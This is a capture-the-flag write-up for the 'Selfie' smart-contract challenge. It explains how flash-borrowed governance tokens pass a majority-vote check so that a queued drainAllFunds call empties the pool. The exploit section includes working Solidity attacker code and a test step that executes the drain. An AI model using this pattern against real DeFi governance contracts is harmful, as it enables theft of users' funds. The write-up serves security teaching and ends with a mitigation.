# Challenge #6: Selfie

The goal of this challenge is to steal all DVT tokens from the pool contract. The challenge seems to be quite easy because the contract has a *drainAllFunds* function that sends all its tokens to the sender. The trick is that it is protected by *onlyGovernance* modifier that requires the transaction to be sent by the governance contract.

Basically, this challenge is an example of a governance mechanism that needs to be abused. The idea of the governance in smart contracts is to decentralize the important functions (e.g. functions that update the contract). The simplest implementation uses voting - when the proposed update is accepted by majority it is applied.

Let's check the code of governance contract. It has a *queueAction* function that allows anyone to queue and later call a function on behalf of the governance contract.  
```
function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
    require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
    require(receiver != address(this), "Cannot queue actions that affect Governance");

    (...)
}
```

The function is protected by two *require* statements. I will start with the second one because it is simpler. It does not allow proposals that call a function on the governance contract itself. 

The first statement calls the *_hasEnoughVotes* function which makes sure that the queued proposal is proposed by someone who has enough votes. The function simply checks whether you, a proposal submitter, have more than a half of the governance tokens. 
```
function _hasEnoughVotes(address account) private view returns (bool) {
    uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
    uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
    return balance > halfTotalSupply;
}
```

Things to notice:
1. The *drainAllFunds* allows to transfer all tokens from the pool and is protected by *onlyGovernance* modifier. 
2. The *onlyGovernance* modifier makes sure that the function in called by the governance contract only.
3. The governance contract allows anyone who has more than a half of governance tokens to queue and call a function to be called by the governance contract.
3. There is a pool that lends governance tokens. 

Can you spot the attack-chain?

## Exploit

The scenario of the attack is following and executed withing one flash-loan transaction:
1. Borrowing more governance tokens than a half of its current supply from the flash loan pool. This will allow to bypass the *_hasEnoughVotes* requirement.
2. Queue a *drainAllFunds(address)* function that will transfer all tokens to the attacker.
3. Pay back the flash loan.

After that I will be able to execute queued function in another transaction.

Let's check the exploit contract:
```
function attack(IPool _lender, IERC20 _liquidityToken, IGovernance _governance) external {
    require(msg.sender == owner);
    
    lender = _lender;
    liquidityToken = _liquidityToken;
    governance = _governance;

    lender.flashLoan(1500000 ether);
} 

function receiveTokens(address token, uint256 amount) external {

    liquidityToken.snapshot();

    bytes memory calld = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );

    actionId = governance.queueAction(address(lender), calld, 0);

    liquidityToken.transfer(address(lender), amount);
}

function drain() external {
    require(msg.sender == owner);

    governance.executeAction(actionId);
}
``` 

The attack is started with the *attack* function. The supply of the governance token (called liquidity token by the pool) is 2kk tokens. I borrow all the tokens that the pool has - 1.5kk tokens - but any amount grater than 1kk would be enough.

Later, in the *receiveTokens*, called back by the pool, I create a snapshot in the governance token  to make sure that the borrowed tokens are included in the current state. Next, I queue a function that calls the *drainAllFunds* and sends all tokens to the owner of the attacker contract - that is me. Finally, I pay off the loan.

After the function is queued I have to wait 2 days until it can be executed and the execute it to drain all tokens as presented on the listing below:

```
/* Wait until the queued function call can be executed */
await time.increase(time.duration.days(2));

/* Execute the function call and drain all tokens */
await this.attContract.drain({ from: attacker });
```

## Lesson learned

The governance can be tricky as shown in this example. There were some security mechanisms, such as a 2 days delay for the execution of queued function calls. Also, the idea to require the majority of votes to accept the proposal seems correct.

However, whenever you build a governance contract you must include a potential threat coming from the flash loans. Your governance token could be available in large amount from the lenders. If that is the case, someone could borrow enough tokens (for a relatively small fee) to validate their malicious proposal.

One possible mitigation to suach threat is to require the process of depositing governance tokens and proposing a change to be executed in different transactions included in different blocks. That would make use of flash loans impossible.

[<< Back to the README](../README.md)
